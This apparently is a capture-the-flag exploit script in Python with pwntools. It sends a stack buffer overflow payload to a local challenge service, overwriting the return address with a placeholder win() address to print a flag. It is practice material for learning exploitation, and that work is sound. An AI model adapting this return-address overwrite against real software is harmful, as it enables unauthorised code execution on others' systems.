#!/usr/bin/env python3
"""
Exploit for buffer overflow challenge
Requires: pwntools (pip install pwntools)
"""

from pwn import *

# Configuration
HOST = 'localhost'
PORT = 9999

# Connect to the challenge
io = remote(HOST, PORT)

# Receive initial output
print(io.recvuntil(b'Enter your name: ').decode())

# Create payload
# Buffer size: 64 bytes
# Need to overwrite return address to point to win() function
# Address of win() function: 0x08049196 (example, adjust based on actual binary)

payload = b'A' * 72  # 64 bytes buffer + 8 bytes saved EBP
payload += p32(0x08049196)  # Address of win() function (example)

# Send payload
io.sendline(payload)

# Get the flag
response = io.recvall(timeout=2).decode()
print(response)

io.close()

# Note: You need to analyze the actual binary to get the correct address
print("\n[!] Remember to update the win() function address after analyzing the binary!")
print("[*] Use 'objdump -d vuln | grep win' to find the correct address")
